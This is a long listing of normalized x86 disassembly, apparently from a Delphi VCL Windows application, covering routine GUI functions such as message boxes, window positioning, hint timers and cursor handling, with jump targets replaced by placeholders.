cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_414078
mov eax 0x8
call sub_4026dc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_413eec
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45a330
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_414098
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026fc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413f38
jmp r-xdata
sub_45a3c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_403638#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_440d34
mov [ esi + 0x44 ] edi
sub_45a444
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45a522
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_4512c4
call sub_407bb0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a529
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_454aa8
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_403638
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45a2b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_4539b0
mov eax [ ebp - 0x4 ]
call sub_459e14
jmp r-xdata
sub_45a544
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40276c
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40278c
push eax
call sub_40276c
pop edx
call sub_40b900
call sub_40276c
mov edx [ rw-data ]
call sub_403324
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40276c
mov edx eax
mov eax ebx
call sub_45a73c
pop esi
pop ebx
retn
call sub_40276c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_45a5d4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_45134c
mov [ ebp - 0x10 ] eax
call sub_451268
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_459578
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_45a729
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a730
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_451400
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_451270
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_45a73c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a7f7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403f80
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45a000
mov eax [ ebp - 0x108 ]
call sub_4043a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
mov edx eax
mov eax ebx
pop ecx
call sub_45a5d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a7fe
lea eax [ ebp - 0x108 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax [ ebp - 0x4 ]
call sub_408514
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402ca8
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402aa4
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
sub_45a814
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_440ef4
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_44105c
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_45aeb8
test al al
je r-xdata
call sub_440d58
mov ebp eax
mov eax edi
call sub_440d58
mov ebp eax
mov eax esi
call sub_45aeb8
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_45a97c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45a9d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45aeb8
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45b704
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a9db
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_45a9e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45aa3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45aeb8
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45b704
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aa43
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_45aa54
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403198
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43a710
jmp r-xdata
sub_45aaa4
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_457fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_440d58
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_457fac
mov ebx eax
mov eax ebx
call sub_44105c
test al al
je r-xdata
mov eax ebx
call sub_440d58
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_45ab08
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_438e1c
mov edi eax
call sub_437718
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_43b724
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_43b724
sub_45ab80
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ac90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45ab08
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_458bb8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_437680
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_45ad40
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_45ac37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_45b0d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45aaa4
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_4198b0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac97
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f0c
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_45aca0
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_457fa4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_457f90
movzx edx di
xor ecx ecx
call sub_43b724
inc esi
dec ebx
jne r-xdata
sub_45acdc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_459df8
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_459df8
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_45aca0
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_45ad40
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4042f4
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403f3c
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43428c
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446f88
xor eax eax
push ebp
push sub_45adc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403198
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_45add4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_45ae30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_457fa4
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_45add4
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_457f90
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_45add4
pop ecx
jmp r-xdata
mov eax ebx
call sub_44105c
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_440d58
push eax
call IsChild
test eax eax
jne r-xdata
sub_45aeb8
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405634
call sub_4252d8
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_45aee0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_45af24
push sub_458c10
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_45b0d8
sub_45af4c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4069ec
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43a088
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_438e1c
call sub_458bf0
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_45b0d8
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4069ec
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43a088
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_45b0d8
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_45aee0
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_43b724
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_45b370
jmp r-xdata
sub_45b05c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45af24
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_45b370
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_45b094
jmp r-xdata
sub_45b094
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44105c
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_440d58
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_440d58
push eax
call ShowWindow
sub_45b0d8
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45b094
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_458d78
mov eax ebx
call sub_45af24
sub_45b110
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_45b252
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41f000
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407b64
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45b223
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41f0b8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b22a
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_45b100
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_45b100
mov [ ebp - 0x4 ] eax
sub_45b22a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_45b264
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403198
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4030e0
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45b2c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45b35e
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b365
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403fd8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41dbc0
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c5ac
mov ebx eax
inc ebx
sub_45b370
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404854
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_45b6f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45b0d8
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45aee0
jmp r-xdata
call sub_451518
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b6fd
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403f0c
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404924
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_438e1c
call sub_458bf0
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_45b110
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_457f24
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_439f10
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
